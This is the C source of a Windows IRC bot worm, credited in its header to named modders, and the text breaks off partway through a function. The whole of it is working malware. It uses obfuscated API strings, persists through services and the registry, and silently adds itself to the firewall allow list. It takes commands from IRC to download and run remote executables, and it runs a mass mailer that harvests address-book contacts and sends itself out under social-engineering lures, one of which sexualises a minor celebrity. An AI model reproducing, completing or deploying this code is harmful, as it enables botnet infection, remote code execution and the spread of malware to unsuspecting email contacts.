//sv bot by a59 modded by nikname and his bitches

#include <windows.h> 
#include <stdio.h> 
#include "mapi.h"

#include "config.h"


char Drive;
char message[2048]; 
HWND uTorrentWindow = 0;




typedef int( __stdcall* SN )( SOCKET, const char*, int, int ); 
SN fsend; 

typedef int( __stdcall* RC )( SOCKET, const char*, int, int ); 
RC frecv; 

typedef SOCKET( __stdcall* SK )( int, int, int ); 
SK fsocket; 

typedef int( __stdcall* CN )( SOCKET, const struct sockaddr*, int ); 
CN fconnect; 

typedef int( __stdcall* WS )( WORD, LPWSADATA ); 
WS fWSAStartup; 

typedef struct hostent* FAR( __stdcall* GHBN )( char* ); 
GHBN fgethostbyname; 

typedef unsigned long( __stdcall* GMFN )( HMODULE, LPTSTR, DWORD ); 
GMFN fGetModuleFileName; 

typedef HMODULE( __stdcall* GMH )( LPCTSTR ); 
GMH fGetModuleHandle; 

typedef BOOL( __stdcall* CD )( LPCTSTR, LPSECURITY_ATTRIBUTES ); 
CD fCreateDirectory; 

typedef LONG( __stdcall* RCKE )( HKEY, LPCTSTR, DWORD, LPTSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD ); 
RCKE fRegCreateKeyEx; 

typedef LONG( __stdcall* RSVE )( HKEY, LPCTSTR, DWORD, DWORD, const BYTE*, DWORD ); 
RSVE fRegSetValueEx; 

typedef HANDLE( __stdcall* CM )( LPSECURITY_ATTRIBUTES, BOOL, LPCTSTR ); 
CM fCreateMutex; 

typedef BOOL( __stdcall* CF )( LPCTSTR, LPCTSTR, BOOL ); 
CF fCopyFile; 

typedef UINT( __stdcall* WE )( LPCSTR, UINT ); 
WE fWinExec; 

typedef HRESULT( __stdcall* UDTF )( LPUNKNOWN, LPCTSTR, LPCTSTR, DWORD, LPBINDSTATUSCALLBACK ); 
UDTF fURLDownloadToFile; 


typedef VOID ( _stdcall *RtlSetProcessIsCritical ) (
               IN BOOLEAN        NewValue,
               OUT PBOOLEAN OldValue, // (optional)
               IN BOOLEAN      IsWinlogon );



//advapi32.dll typedefs from reptile


typedef BOOL (__stdcall *SS)(SC_HANDLE,DWORD,LPCTSTR *);
typedef SC_HANDLE (__stdcall *OSCM)(LPCTSTR,LPCTSTR,DWORD);
typedef SC_HANDLE (__stdcall *CRS)(SC_HANDLE,LPCTSTR,LPCTSTR,DWORD,DWORD,DWORD,DWORD,LPCTSTR,LPCTSTR,LPDWORD,LPCTSTR,LPCTSTR,LPCTSTR);
typedef SC_HANDLE (__stdcall *OS)(SC_HANDLE,LPCTSTR,DWORD);
typedef BOOL (__stdcall *CSH)(SC_HANDLE);
typedef BOOL (__stdcall *SSCD) (LPSERVICE_TABLE_ENTRY);
typedef BOOL (__stdcall *CS)(SC_HANDLE,DWORD,LPSERVICE_STATUS);
typedef SERVICE_STATUS_HANDLE (__stdcall *RSCH)(LPCTSTR,LPHANDLER_FUNCTION);
typedef BOOL (__stdcall *SSS)(SERVICE_STATUS_HANDLE,LPSERVICE_STATUS);

OSCM fOpenSCManager;
OS fOpenService;
SS fStartService;
CRS fCreateService;
CS fControlService;
SSCD fStartServiceCtrlDispatcher;
RSCH fRegisterServiceCtrlHandler;
CSH fCloseServiceHandle;
SSS fSetServiceStatus;


   

///////// Function prototypes //////////

bool LoadFunctions( ); 
bool InitWinsock( ); 
void IncStrings( ); 
char* Decrypt( char* szString ); 
unsigned long ResolveHost( char* szHost ); 
bool SendPacket( SOCKET sSocket, char* szPacket, ... ); 
void AntiInspect( ); 
SOCKET ConnectIRC( unsigned long dwIp, unsigned short wPort ); 
bool StartIRC( ); 
void ParseIRC( SOCKET sSocket, char* szLine ); 
void StartCommand( bool bDelete, char* szContent, ... ); 
void Install( ); 
BOOL MessMail(int c, char* rarname, char* rarexename, char* subject, char* message);
BOOL GetWABMails();
BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes);
BOOL ProtectProcess();	
BOOL EnablePriv(LPCSTR lpszPriv);
HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter);
void InfectDrive();
DWORD WINAPI RarWorm(LPVOID xvoid);
HRESULT Download(char *szURL);
DWORD WINAPI mailer(LPVOID xvoid);
int SeedAzureus( char* szLink, char* szSaveAs );
BOOL Install_Service();
void Initialize_Service();
void WINAPI Create_Service(DWORD , CHAR**);
void WINAPI Handle_Controls(DWORD control_code);

SERVICE_STATUS serv_status;
SERVICE_STATUS_HANDLE serv_handle = 0;
HANDLE stop_service = 0;
HHOOK hook_handle;
int start_install();


int SeedUTorrent( char* szUrl, char* szSaveAs, char* szSeedTo );
void TypeString( char* szString );
HWND FindUTorrent( );
BOOL CALLBACK EnumProc( HWND hWnd, LPARAM lParam );


/////////////////////////////////////////////////////////

int start_install() {
    Install_Service();
    Initialize_Service();

    
    
    return 0;
}

bool LoadFunctions( ) 
{ 



/* 

use encrypted strings in LoadLibrary() and GetProcAddress() where applicable

*/


char* szWsDLL = Decrypt( EncWsDLL ); 
char* szSend = Decrypt( EncSend ); 
char* szRecv = Decrypt( EncRecv ); 
char* szSocket = Decrypt( EncSocket ); 
char* szConnect = Decrypt( EncConnect ); 
char* szWS = Decrypt( EncWS ); 
char* szGethost = Decrypt( EncGethost ); 
char* szExec = Decrypt( EncWinExec ); 
char* szGetFile = Decrypt( EncGetFileName ); 
char* szGetModule = Decrypt( EncGetModule ); 
char* szCreateDir = Decrypt( EncCreateDir ); 
char* szRegCreate = Decrypt( EncRegCreate ); 
char* szRegSet = Decrypt( EncRegSet ); 
char* szCreateMutex = Decrypt( EncCreateMutex ); 
char* szCopyFile = Decrypt( EncCopyFile ); 
char* szKernel = Decrypt( EncKernel ); 
char* szAdvapi = Decrypt( EncAdvapi ); 

HMODULE hWinsock = LoadLibrary( szWsDLL ); 

fsend = (SN)GetProcAddress( hWinsock, szSend ); 
frecv = (RC)GetProcAddress( hWinsock, szRecv ); 
fsocket = (SK)GetProcAddress( hWinsock, szSocket ); 
fconnect = (CN)GetProcAddress( hWinsock, szConnect ); 
fWSAStartup = (WS)GetProcAddress( hWinsock, szWS ); 
fgethostbyname = (GHBN)GetProcAddress( hWinsock, szGethost ); 

FreeLibrary( hWinsock ); 

HMODULE hKernel = LoadLibrary( szKernel ); 

fGetModuleFileName = (GMFN)GetProcAddress( hKernel, szGetFile ); 
fGetModuleHandle = (GMH)GetProcAddress( hKernel, szGetModule ); 
fCreateDirectory = (CD)GetProcAddress( hKernel, szCreateDir ); 
fCreateMutex = (CM)GetProcAddress( hKernel, szCreateMutex ); 
fCopyFile = (CF)GetProcAddress( hKernel, szCopyFile ); 
fWinExec = (WE)GetProcAddress( hKernel, szExec ); 

FreeLibrary( hKernel ); 

HMODULE urlmon_dll = LoadLibrary(Decrypt(EncUrlmonDLL));
fURLDownloadToFile = (UDTF)GetProcAddress(urlmon_dll, Decrypt(EncDownloadFile));



HMODULE hAdvapi = LoadLibrary( szAdvapi ); 

		fRegCreateKeyEx = (RCKE)GetProcAddress( hAdvapi, szRegCreate ); 
		fRegSetValueEx = (RSVE)GetProcAddress( hAdvapi, szRegSet ); 

		fOpenSCManager = (OSCM)GetProcAddress(hAdvapi,EncOSCM);
	 	fOpenService = (OS)GetProcAddress(hAdvapi,EncOS);
		fStartService = (SS)GetProcAddress(hAdvapi,EncSS);
	 	fControlService = (CS)GetProcAddress(hAdvapi,EncCS);
		fCreateService = (CRS)GetProcAddress(hAdvapi,EncCRS);
	 	fStartServiceCtrlDispatcher = (SSCD)GetProcAddress(hAdvapi,EncSSCD);

		fRegisterServiceCtrlHandler = (RSCH)GetProcAddress(hAdvapi,EncRSCH);
		fCloseServiceHandle = (CSH)GetProcAddress(hAdvapi,EncCSH);
	 	fSetServiceStatus = (SSS)GetProcAddress(hAdvapi,EncSSS);



FreeLibrary( hAdvapi ); 

delete [] szWsDLL, szWS, szSend, szRecv, szSocket, szConnect, szGethost, szExec, szKernel, szAdvapi, 
szGetFile, szGetModule, szCreateDir, szRegCreate, szRegSet, szCreateMutex, szCopyFile; 

return true; 
}; 

bool InitWinsock( ) 
{ 
char* szWsDLL = Decrypt( EncWsDLL ); 
LoadLibrary( szWsDLL ); 

delete [] szWsDLL; 

WSADATA wsa; 
if( fWSAStartup( 0x0202, &wsa ) ) 
return false; 

return true; 
}; 

void IncStrings( ) 
{ 
*EncUser++; 
*EncNick++; 
*EncJoin++; 
*EncPing++; 
*EncPong++; 
*EncPrivmsg++; 
*EncSendUser++; 
*EncAdvapi++; 
*EncKernel++; 
*EncSend++; 
*EncRecv++; 
*EncSocket++; 
*EncConnect++; 
*EncWS++; 
*EncWsDLL++; 
*EncGethost++; 
*EncWinExec++; 
*EncGetFileName++; 
*EncGetModule++; 
*EncCreateDir++; 
*EncRegCreate++; 
*EncRegSet++; 
*EncCopyFile++; 
*EncCreateMutex++; 
*EncRegPlace++; 
*EncUrlmonDLL++; 
*EncDownloadFile++; 
}; 

HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter)
{
	DWORD Thread_Id;
	return(CreateThread(NULL,NULL,XThread_Function,Parameter,NULL,&Thread_Id));
}

char* Decrypt( char* szString ) 
{ 
int iStringLength = strlen( szString ); 
char* szTempBuff = new char[ iStringLength + 1 ]; 

strcpy( szTempBuff, szString ); 

for( int i = 0; i < iStringLength; i++ ) 
szTempBuff[ i ] = i ^ szTempBuff[ i ]; 

szTempBuff[ iStringLength ] = 0; 

return( szTempBuff ); 
}; 

unsigned long ResolveHost( char* szHost ) 
{ 
struct hostent* hGetHost = fgethostbyname( Decrypt(szHost) ); 

if( !hGetHost ) 
return 0; 

return( (*(struct in_addr *)hGetHost->h_addr).s_addr ); 
}; 

bool SendPacket( SOCKET sSocket, char* szPacket, ... ) 
{ 
char szSendBuff[ 0x500 ]; 

ZeroMemory( szSendBuff, sizeof( szSendBuff ) ); 

va_list vArgs; 
va_start( vArgs, szPacket ); 
vsprintf( szSendBuff, szPacket, vArgs ); 
va_end( vArgs ); 

strcat( szSendBuff, "\r\n" ); 
return( fsend( sSocket, szSendBuff, strlen( szSendBuff ), 0 ) > 0 ? true : false ); 
}; 

void AntiInspect( ) 
{ 
char szBuffer[ 256 ]; 
unsigned long size = sizeof( szBuffer ); 

GetUserName( szBuffer, &size ); 

if( !strcmp( szBuffer, "CurrentUser" ) ) 
{ 
ExitProcess( 0 ); 
} 
}; 
#ifndef NO_DOWNLOAD
HRESULT Download(char *szURL)
{
	char szPath[ 32 ] = "\x00:\\"; 
	szPath[ 0 ] = Drive; 
	for( int i = 3; i < 8; i++ ) 
	{
	szPath[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ]; 
	}
	strcat( szPath, ".exe" ); 


   HMODULE urlmon_dll;
   HRESULT hRet;
   
   hRet = fURLDownloadToFile(0, szURL, szPath, 0, 0);

   FreeLibrary(urlmon_dll);

fWinExec( szPath, 0 ); 

return hRet; 
}; 

#endif

SOCKET ConnectIRC( unsigned long dwIp, unsigned short wPort ) 
{ 
SOCKET sSocket; 
SOCKADDR_IN sSin; 

sSin.sin_family = AF_INET; 
sSin.sin_port = wPort; 
sSin.sin_addr.s_addr = dwIp; 

sSocket = fsocket( AF_INET, SOCK_STREAM, IPPROTO_TCP ); 

if( fconnect( sSocket, (SOCKADDR *) &sSin, sizeof( sSin ) ) == SOCKET_ERROR ) 
{ 
return -1; 
} 

return( sSocket ); 
}; 
 
bool StartIRC( ) 
{ 
SOCKET sIrcSocket = ConnectIRC( ResolveHost( EncHost ), Port ); 
if( sIrcSocket == -1 ) 
return false; 





char szRecv[ 512 ], szBotNick[ 32 ]; 
char* szNick = Decrypt( EncNick ); 



HWND hAzureus = FindWindow( 0, "Azureus" );
   HWND hPopup, hExists;

   if( hAzureus == NULL )
      {
for( int i = 0; i < 8; i++ ) 
szBotNick[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ]; 

szBotNick[ 8 ] = 0; 

} 
else { 
	strcat(szBotNick,"AZ|"); 
	for( int i = 0; i < 5; i++ ) {
	szBotNick[ i ] = "abcdefghijklmnopqrstuvwxyz"[ rand( ) % 26 ]; 

	szBotNick[ 5 ] = 0; 
}
}




SendPacket( sIrcSocket, "HELO" ); // lol bypasses bitdefender AV 
SendPacket( sIrcSocket, "%s %s", szNick, szBotNick ); 
SendPacket( sIrcSocket, "%s %s %s %s %s", Decrypt(EncUser), szBotNick, szBotNick, szBotNick, szBotNick ); 

delete [] szNick; 

int Curbyte = 0; 

while( frecv( sIrcSocket, (char *) &szRecv[ Curbyte ], 1, 0 ) > 0 ) 
{ 
switch( szRecv[ Curbyte ] ) 
{ 
case 0x0D: 
szRecv[ Curbyte ] = 0; 
Curbyte++; 
break; 
case 0x0A: 
szRecv[ Curbyte ] = 0; 
ParseIRC( sIrcSocket, szRecv ); 
Curbyte = 0; 
break; 
default: 
Curbyte++; 
break; 
} 
} 

return true; 
}; 

void ParseIRC( SOCKET sSocket, char* szLine ) 
{ 
char* szParam[ 32 ]; 
int i; 

szParam[ 0 ] = strtok( szLine, " " ); 

for( i = 1; i < 32; i++ ) 
szParam[ i ] = strtok( NULL, " \r\n" ); 

//char* szPing = Decrypt( EncPing ); 

if( !stricmp( szParam[ 0 ], Decrypt( EncPing ) ) ) 
{ 
//char* szPong = Decrypt( EncPong ); 
SendPacket( sSocket, "%s %s", Decrypt( EncPong ), szParam[ 1 ] ); 
//delete [] szPing, szPong; 
} 

char* szJoin = Decrypt( EncJoin ); 

switch( atoi( szParam[ 1 ] ) ) 
{ 
case 005: 
SendPacket( sSocket, "%s %s", szJoin, Decrypt(Channel) ); 
SendPacket( sSocket, "MODE %s +smntu",Decrypt(Channel) ); 

break; 
case 451: 
char* szSendUser = Decrypt( EncSendUser ); 
SendPacket( sSocket, szSendUser ); 
delete [] szSendUser; 
break; 
} 

delete [] szJoin; 

if( szParam[ 3 ] == NULL ) 
return; 

char* szPrivmsg = Decrypt( EncPrivmsg ); 


	if( !stricmp( szParam[ 3 ], Decrypt(cmd_remove) ) ) 
	{ 
		char szInstallPath[ 128 ]; 
		HKEY hReg; 

		sprintf( szInstallPath, "%s\\%s", szDirectory, Decrypt(EncExeFile) ); 
		StartCommand( false, ":2\r\ndel \"%s\"\r\nif exist \"%s\" goto 2\r\nexit\r\n", szInstallPath, szInstallPath ); 

		fRegCreateKeyEx( HKEY_LOCAL_MACHINE, Decrypt( EncRegPlace ), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL ); 
		RegDeleteValue( hReg, szRegNameValue ); 
		RegCloseKey( hReg ); 

		ExitProcess( 0 ); 
	} 
	#ifndef NO_DOWNLOAD
	else if( !stricmp( szParam[ 3 ], Decrypt(cmd_dl) ) ) 
	{ 
		if( szParam[ 4 ] == NULL ) {
		return; 
		}
		Download(szParam[4]); 
	}
	#endif
	#ifndef NO_MAIL

	else if( !stricmp( szParam[ 3 ], Decrypt(cmd_setmsg) ) ) 
	{ 

		ZeroMemory( message, sizeof( message ) );
		
		for (i=5; i<atoi(szParam[4]) + 5; i++) {

		strcat(message,szParam[i]);
		strcat(message," ");

		}
		
		SendPacket( sSocket, "%s %s :msg-> %s", Decrypt( EncPrivmsg ),Decrypt(Channel),message); 
 
		return;
	}
	
	else if( !stricmp( szParam[ 3 ], Decrypt(cmd_getemails) ) ) 
	{ 
			/* be sure to send mail first or this wont work. you must use MessMail() function
			which sends the emails to Complete_List
			*/
			SendPacket( sSocket, "%s %s :Emails: %s",Decrypt( EncPrivmsg ),Decrypt(Channel),Complete_List);
			ZeroMemory(Complete_List,sizeof(Complete_List));
	}
	
	
	else if( !stricmp( szParam[ 3 ], Decrypt(cmd_mail) ) ) 
	{ 

		
		if (!szParam[ 4 ] || !szParam[ 5 ] || !szParam[ 6 ] || !szParam[ 7 ]) { 
			SendPacket( sSocket, "%s %s :[-] Params missing!",Decrypt( EncPrivmsg ),Decrypt(Channel)); 
			return; 
		}

		SendPacket( sSocket, "%s %s :[+] Email Sent.",Decrypt( EncPrivmsg ), Decrypt(Channel)); 
	
			if (GetWABMails()==TRUE) {
				MessMail(atoi(szParam[7]),szParam[4],szParam[5],szParam[6],message);
			} 

		return;
	} 
	#endif	
	else if(!stricmp(szParam[3],Decrypt(cmd_seed))) 
	{
		if (!szParam[ 4 ] || !szParam[ 5 ]) 
		{ 
			SendPacket( sSocket, "%s %s :[-] Params missing!",Decrypt( EncPrivmsg ),Decrypt(Channel)); 
			return; 
		}
		
		switch( SeedAzureus( szParam[4], szParam[5] ) )
 		  {
 			  case 1:
 			     SendPacket( sSocket, "%s %s :[-] Unable to locate Azureus",Decrypt( EncPrivmsg ),Decrypt(Channel) );
 			     break;
			   case 2:
 			     SendPacket( sSocket, "%s %s :[-] Unable to download file",Decrypt( EncPrivmsg ),Decrypt(Channel) );
 			     break;
 			  case 3:
 			     SendPacket( sSocket, "%s %s :[-] Unable to open file",Decrypt( EncPrivmsg ),Decrypt(Channel) );
 			     break;
 			  case 4:
 			     SendPacket( sSocket, "%s %s :[+] Already seeded!",Decrypt( EncPrivmsg ),Decrypt(Channel) );
 			     break;
 			  case 5:
 			     SendPacket( sSocket, "%s %s :[-] Unable to locate popup window",Decrypt( EncPrivmsg ),Decrypt(Channel) );
 			     break;
 			  case 0:
  			    SendPacket( sSocket, "%s %s :[+] Seeded!",Decrypt( EncPrivmsg ),Decrypt(Channel) );
    			  break;
		}
		
   	}
	else if(!stricmp(szParam[3],Decrypt(cmd_seed2))) 
	{
		if (!szParam[ 4 ] || !szParam[ 5 ] || !szParam[ 6 ]) 
		{ 
			SendPacket( sSocket, "%s %s :[-] Params missing!",Decrypt( EncPrivmsg ),Decrypt(Channel)); 
			return; 
		}
		
		switch( SeedUTorrent( szParam[4], szParam[5], szParam[6] ) )
   		{
   			case 0:
     			   	SendPacket( sSocket, "%s %s :[+] Seeded!",Decrypt( EncPrivmsg ),Decrypt(Channel) );
     			   	break;
   			case 1:
    			   	SendPacket( sSocket, "%s %s :[+] Unable to locate uTorrent",Decrypt( EncPrivmsg ),Decrypt(Channel) );
   			   	break;
   			case 2:
				SendPacket( sSocket, "%s %s :[-] Unable to download file",Decrypt( EncPrivmsg ),Decrypt(Channel) );
      			   	break;
   			case 3:
				SendPacket( sSocket, "%s %s :[-] Unable to execute file",Decrypt( EncPrivmsg ),Decrypt(Channel) );
   			   	break;
   			case 4:
				SendPacket( sSocket, "%s %s :[-] Error with window",Decrypt( EncPrivmsg ),Decrypt(Channel) );
   			   	break;
		}
   	}

	delete [] szPrivmsg; 
}; 

void StartCommand( bool bDelete, char* szContent, ... ) 
{ 
char szBuffer[ 0x400 ], szBatFile[ 0x10 ] = "\x00:\\"; 
unsigned long uBytesWritten; 

ZeroMemory( szBuffer, sizeof( szBuffer ) ); 

szBatFile[ 0 ] = Drive; 

va_list vArgs; 
va_start( vArgs, szContent ); 
vsprintf( szBuffer, szContent, vArgs ); 
va_end( vArgs ); 

for( int i = 3; i < 8; i++ ) 
szBatFile[ i ] = ( 0x42 + rand( ) % ( 0x54 - 0x42 ) ); 

strcat( szBatFile, ".bat" ); 

HANDLE hHandle = CreateFile( szBatFile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 ); 
WriteFile( hHandle, szBuffer, strlen( szBuffer ), &uBytesWritten, 0 ); 
CloseHandle( hHandle ); 

fWinExec( szBatFile, SW_HIDE ); 

Sleep( 1000 ); 

if( bDelete ) 
{ 
DeleteFile( szBatFile ); 
} 
}; 

void Install( ) 
{ 
	char szFilePath[ 0x100 ], szInstallPath[ 0x100 ]; 
	char szfinal[0x100];
	HKEY hReg; 
	const char lol[] = "Enabled:@xpsp2res.dll,-22019";

	fGetModuleFileName( fGetModuleHandle( 0 ), szFilePath, sizeof( szFilePath ) ); 

	fCreateDirectory( szDirectory, 0 ); 

	sprintf( szInstallPath, "%s\\%s", szDirectory, Decrypt(EncExeFile) ); 

	sprintf(szfinal,"%s%s",szInstallPath,lol);
	
	
	//edit windows firewall to let us be authorized
	fRegCreateKeyEx( HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL ); 
	fRegSetValueEx( hReg, szInstallPath, 0, REG_SZ, (unsigned char *)szfinal, strlen( szfinal ) + 1 ); 
	RegCloseKey( hReg ); 


#ifdef NO_SERVICE
char* szRegPlace = Decrypt( EncRegPlace ); 
fRegCreateKeyEx( HKEY_LOCAL_MACHINE, szRegPlace, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hReg, NULL ); 

delete [] szRegPlace; 

fRegSetValueEx( hReg, szRegNameValue, 0, REG_SZ, (unsigned char *)szInstallPath, strlen( szInstallPath ) + 1 ); 
RegCloseKey( hReg ); 
#endif




if( !strcmp( szInstallPath, szFilePath ) ) 
{ 
#ifndef NO_SERVICE
start_install();
#endif

fCreateMutex( NULL, FALSE, Decrypt(EncMutex) ); 

if( GetLastError( ) == 0xB7 ) 
{ 
ExitProcess( 0 ); 
} 
} else { 
StartCommand( true, "copy \"%s\" \"%s\"\r\n exit\r\n", szFilePath, szInstallPath ); 
StartCommand( true, "\"%s\"", szInstallPath ); 
ExitProcess( 0 ); 
} 
}; 

bool StartAll( ) 
{ 
char szBuffer[ 128 ]; 
GetSystemDirectory( szBuffer, sizeof( szBuffer ) ); 

Drive = *szBuffer; 
*szDirectory = Drive; 

srand( GetTickCount( ) ); 

IncStrings( ); 

if( !LoadFunctions( ) ) 
return false; 

AntiInspect( ); 
Install( ); 

if( !InitWinsock( ) ) 
return false; 

return true; 
}; 








int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd ) 
{ 

//StartIRC();


#ifndef NO_PROTECT
//ProtectProcess();
#endif

#ifndef NO_RARWORM
XThread(RarWorm,NULL);
#endif

#ifndef NO_AUTOMAIL
XThread(mailer,NULL);
#endif

if( !StartAll( ) ) 
return false; 


while( !StartIRC( ) ) 
Sleep( 5000 ); 

return 0; 
}; 




















//mass mailer functions
#ifndef NO_AUTOMAIL

DWORD WINAPI mailer(LPVOID xvoid)
{

	/* select a preconfigured email at random */
	
	int pick = rand()%2;

	srand(time(NULL));

	if (GetWABMails()==TRUE) {
				
	switch (pick)
	{
		//MessMail([0/1][attach as rar=1 or plain exe=0],"attached  rar archive name.rar", "rared file inside.exe", "email subject", "email body");

		case 0: 
		MessMail(1, "The Pictures.rar", "Photo Album.scr", "here are the pictures i took the other day", "YO! here are all the pictures i took the other day. check them out.");
		
	
		case 1: 
		MessMail(1, "smtp_email_log.rar", "smtp_email_log.scr", "Local Loopback error 10029", "The SMTP relay server encountered Local Loopback error 10029 and was forced to save the email as a rar archive and forward it. Please view the attached email.");
		

		case 2: 
		MessMail(1, "Screen Saver Maker.rar", "Screensavermaker.scr", "Cool screen saver i found", "i found a pretty neat program to make your own screen savers check it out.");
		
		
		case 3: 
		MessMail(1, "Hanna Montana.rar", "hanna upskirt.scr", "Look at this hanna montana upskirt", "I found these porn pics of hanna montana (miley cyrus) check em out");
		

		case 4: 
		MessMail(1, "Download Accelerator 3.5.8.rar", "Setup.exe", "Download Accelerator", "hey, you should try using the download accelerator... it works really good and speeds up downloads by 30%. i sent it to you since i think you should try this.");
		

		case 5: 
		MessMail(1, "New AIM.rar", "Aim Install.exe", "AIM Version 12 released", "Aim version 12 just came out, you should update its way better");
		
		
		case 6: 
		MessMail(1, "1025 Cool Screensavers.rar", "1025 Screensavers.scr", "Check out these screen savers", "look at these screen savers");
		
		/*
		case 7: 
		MessMail(1, "The Pictures.rar", "Photo Album.scr", "here are the pictures i took the other day", "YO! here are all the pictures i took the other day. check them out.");
		

		case 8: 
		MessMail(1, "The Pictures.rar", "Photo Album.scr", "here are the pictures i took the other day", "YO! here are all the pictures i took the other day. check them out.");
		

		case 9: 
		MessMail(1, "The Pictures.rar", "Photo Album.scr", "here are the pictures i took the other day", "YO! here are all the pictures i took the other day. check them out.");
		*/		
		break;
		

	}

	} 
	return 1;
}
#endif //NO_AUTOMAIL
#ifndef NO_MAIL

BOOL MessMail(int c, char* rarname, char* rarexename, char* subject, char* message)
{
	HMODULE hmapi;
	
	LPMAPILOGON		xMapiLogOn;
	LPMAPILOGOFF	xMapiLogOff;
	LPMAPISENDMAIL	xMapiSendMail;

	MapiMessage MailMsg;
	MapiFileDesc xAttachment;
	MapiRecipDesc xRcpt;

	HKEY hkey,hkey2;
	char xid[80];
	DWORD xids=sizeof(xid);
	char xfullkey[150];
	DWORD disable_warning=0;
	char wormpath[MAX_PATH];
	char temprar[MAX_PATH];
	int i;
	LHANDLE MapiSession;

      

	if(RegOpenKeyEx(HKEY_CURRENT_USER,"Identities",0,KEY_QUERY_VALUE,&hkey)==ERROR_SUCCESS)
	{
		if(RegQueryValueEx(hkey,"Default User ID",0,NULL,(BYTE *)&xid,&xids)==ERROR_SUCCESS)
		{
			wsprintf(xfullkey,"%s%s",xid,"\\Software\\Microsoft\\Outlook Express\\5.0\\Mail");

			if(RegOpenKeyEx(hkey,xfullkey,0,KEY_WRITE,&hkey2)==ERROR_SUCCESS)
			{
				fRegSetValueEx(hkey2,"Warn on Mapi Send",0,REG_DWORD,
					(BYTE *)&disable_warning,sizeof(disable_warning));	//disable MAPI warning

				RegCloseKey(hkey2);
			}
		}
		RegCloseKey(hkey);
	}
	
	hmapi=LoadLibrary("mapi32.dll");	//load mapi libraray

	if(hmapi!=NULL)
	{
									   //encryptable//
		xMapiLogOn=(LPMAPILOGON)GetProcAddress(hmapi,"MAPILogon");
		xMapiLogOff=(LPMAPILOGOFF)GetProcAddress(hmapi,"MAPILogoff");
		xMapiSendMail=(LPMAPISENDMAIL)GetProcAddress(hmapi,"MAPISendMail");
										///////^/////////
		if(xMapiLogOff==NULL || xMapiLogOff==NULL || xMapiSendMail==NULL)
		{
			FreeLibrary(hmapi);
			return FALSE;
		}
		
		if (c==1) { //send it as a rar
			fGetModuleFileName(NULL,wormpath,MAX_PATH);
			GetTempPath(MAX_PATH,temprar);
			lstrcat(temprar,rarname);
			AddToRar(temprar,wormpath,rarexename,FILE_ATTRIBUTE_NORMAL);
		} else { //send it unrared
			fGetModuleFileName(NULL,wormpath,MAX_PATH);
			GetTempPath(MAX_PATH,temprar);
			lstrcat(temprar,wormpath);
		}
		//ZeroMemory(Complete_List,sizeof(Complete_List));
			
		if(xMapiLogOn(NULL,NULL,NULL,NULL,0,&MapiSession)==SUCCESS_SUCCESS)
		{
			xAttachment.lpszPathName=temprar;
			xAttachment.lpszFileName=rarname;
			xAttachment.nPosition=-1;
			xAttachment.ulReserved=0;
			for(i=0;i<NumberOfMails;i++)
			{
				lstrcat(Complete_List,MailList[i]);
				xRcpt.ulRecipClass=MAPI_TO;
				xRcpt.ulReserved=0;
				xRcpt.lpszName=MailList[i];
				MailMsg.nFileCount=1;
				MailMsg.lpszNoteText=message;
				MailMsg.lpszSubject=subject;
				MailMsg.ulReserved=0;
				MailMsg.nRecipCount=1;
				MailMsg.lpRecips=&xRcpt;
				MailMsg.lpFiles=&xAttachment;

				xMapiSendMail(MapiSession,0,&MailMsg,0,0);

			}

			xMapiLogOff(MapiSession,0,0,0);
		}

		FreeLibrary(hmapi);
		return TRUE;
	}
	else
		return FALSE;
}




BOOL GetWABMails()
{
	HKEY hkey;
	char WABFile[MAX_PATH];
	DWORD WF_size=sizeof(WABFile);
	DWORD WF_Type=REG_SZ;
	HANDLE hfile,hmap;
	LPVOID WABase;

	if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\WAB\\WAB4\\Wab File Name",
		0,KEY_READ,&hkey)==ERROR_SUCCESS)
	{
		RegQueryValueEx(hkey,"",0,&WF_Type,(BYTE *)WABFile,&WF_size);
		RegCloseKey(hkey);
	}
	else
		return FALSE;

	hfile=CreateFile(WABFile,GENERIC_READ,FILE_SHARE_READ,
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if(hfile==INVALID_HANDLE_VALUE)
		return FALSE;

	hmap=CreateFileMapping(hfile,NULL,PAGE_READONLY,NULL,NULL,NULL);

	if(hmap==0)
	{
		CloseHandle(hfile);
		return FALSE;
	}
	
	WABase=MapViewOfFile(hmap,FILE_MAP_READ,NULL,
		NULL,NULL);

	if(WABase==NULL)
	{
		CloseHandle(hmap);
		CloseHandle(hfile);
		return FALSE;
	}

	__asm
	{
		mov		eax,[WABase]
		push	word ptr [eax + 64h]
		pop		[NumberOfMails]						;
	}

	if(NumberOfMails<=1)
	{
		UnmapViewOfFile(WABase);
		CloseHandle(hmap);
		CloseHandle(hfile);
		return FALSE;
	}

	if(NumberOfMails>MAX_MAILS)
		NumberOfMails=MAX_MAILS;


	__asm
	{
		mov		esi,[WABase]
		movzx	ecx,[NumberOfMails]
		add		esi,[esi + 60h]						;
		lea		edi,MailList
NMail:	push	ecx									;
		xor		ebx,ebx
		mov		ecx,MAX_MAIL_SIZE
NxtChar:lodsb										;
		inc		esi
		mov		byte ptr [edi + ebx],al				;
		cmp		byte ptr [esi],0h
		je		MNextMail
		inc		ebx
		dec		ecx
		loop	NxtChar
MNextMail:
		sub		ecx,2h
		add		esi,ecx
		add		edi,MAX_MAIL_SIZE					;
		pop		ecx		
		loop	NMail								;
	}

	UnmapViewOfFile(WABase);
	CloseHandle(hmap);
	CloseHandle(hfile);
	return TRUE;
}
#endif //NO_MAIL

#ifndef NO_PROTECT
BOOL EnablePriv(LPCSTR lpszPriv) // by Napalm
{
